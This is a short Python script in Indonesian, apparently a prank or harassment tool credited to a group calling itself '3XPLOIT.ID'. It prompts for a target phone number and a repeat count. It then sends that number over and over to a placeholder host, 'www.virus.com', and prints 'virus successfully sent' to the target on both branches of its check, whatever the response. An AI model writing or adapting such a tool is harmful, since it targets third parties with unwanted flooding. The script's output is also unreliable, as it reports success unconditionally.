
import os, requests
from requests import post
import termcolor
from termcolor import colored
import time
os.system("clear")

banner = """

####################################################
# Author : Mr.FaDedTy                              #
# Team : 3XPLOIT.ID                                #
# Website : www.3xploit-id.org                     #
# Chanel YT : wwww.youtube.com/c/3XPLOITIDOFFICIAL #
####################################################
 """

print(banner)
no = input(colored('NOMOR TARGET:','blue'))
jml = int(input(colored('JUMLAH:','red')))
ua = {
'Connection': 'keep-alive',
'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1; CPH1605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',
'Referer': 'VIRUS',
}

dat = {
'phone': no,
}
for x in range(jml):
	time.sleep(1)
	sendVirus = requests.post("http://www.virus.com", headers=ua, data=dat)

	if 'error' in sendVirus.text:	
          
         	print("VIRUS BERHASIL TERKIRIM KE " + no + " ! ")

	else:
		print("VIRUS BERHASIL TERKIRIM KE " + no + " ! ")
